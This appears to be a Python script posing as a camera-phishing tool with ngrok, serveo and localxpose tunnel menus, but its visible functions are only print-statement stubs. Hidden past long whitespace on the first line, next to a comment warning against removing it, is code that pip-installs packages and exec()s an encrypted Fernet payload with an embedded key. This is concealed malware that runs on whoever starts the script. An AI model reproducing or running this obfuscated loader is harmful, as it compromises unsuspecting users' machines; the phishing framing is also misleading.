# This Python file uses the following encoding: utf-8   (this installs dependencies automatically for you REMOVING THIS WILL MAKE THE SCRIPT UNUSABLE!!)                 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'6HP96GISW91mnUleyejtRZ4mW7QvGRCc3d_KfkB_l1c=').decrypt(b'gAAAAABoB6DqmDEwll_aPCMM08oQGPuRNLHh-R1fU2Xv4ZcS-20-dkW1lfbfTfSH3oF0z5njpR5DqzR3kRaMbliRKi7-HNPMMORdi39IZdpIi67kgUecSW-QxI-md7519ZZuRCDOh1hZQhjgC5KuJSou-5F5apiVJah7qgjR9AcNXQf1pMwAcPAz0KZAgTjQTMdOI4ba15vqpBpf9PDUDGUwkn8srJ6jwA=='))

RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2= 'RED', 'WHITE', 'CYAN', 'GREEN', 'DEFAULT', 'YELLOW', 'YELLOW2', 'GREEN2'                                                                                                                                                                                                                                                               
blink = 'BLINK'

def menu_q():
    print('            {5}                                                 \n               |  {2}"{3}UNIX IS VERY SIMPLE {2}IT JUST NEEDS A{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print('               {5}|  {2}GENIUS TO UNDERSTAND ITS SIMPLICITY"{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("               {5}|                       {0}~{3}Dennis Ritchie{5}  |\n{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    input("\n\nDo you agree to use this tool for educational purposes only? (Y/N)\n")

def div_q():
    input("\n\n[{2}#{0}] IF YOU'RE USING THIS TOOL IN ANDROID PRESS 'Y' (Y/N)\n".format(RED, CYAN))
    print("Simulated android banner or banner here...")

def option():
    print("\n----------------------------------\n[ FRONT CAMERA  OR BACK CAMERA ?? ] \n----------------------------------\n")
    print("[1] FRONT CAMERA \n[2] BACK CAMERA")
    choice = input("Select: ")
    if choice == '1':
        print("You selected FRONT CAMERA")
    elif choice == '2':
        print("You selected BACK CAMERA")
    else:
        option()

def selectPort():
    print("[ Select Any Available Port [1-65535]: ]")
    input("Enter port: ")
    return "1234"  # Dummy port

def runNgrok(port):
    print("[NGROK] This would start a tunnel on port", port)

def customLocalxpose(port):
    print("[CUSTOM LOCALXPOSE] Enter subdomain:")
    input()
    print("This would start a custom localxpose tunnel on port", port)

def randomLocalxpose(port):
    print("Starting RANDOM localxpose on port", port)

def randomServeo(port):
    print("Starting RANDOM serveo tunnel on port", port)

def selectServer(port):
    print("\nSelect Server: [1] Ngrok [2] Serveo [3] Localxpose")
    choice = input("Enter choice: ")
    if choice == '1':
        runNgrok(port)
    elif choice == '2':
        randomServeo(port)
    elif choice == '3':
        print("[Localxpose] Choose URL type: [1] Custom [2] Random")
        ichoice = input()
        if ichoice == '1':
            customLocalxpose(port)
        else:
            randomLocalxpose(port)
    else:
        selectServer(port)

def main():
    input("[#] Are you using Android? (Y/N): ")
    print("Showing banner...")
    print("Checking dependencies... (simulated)")
    print("Setting up environment... (simulated)")
    port = selectPort()
    option()
    selectServer(port)

main()
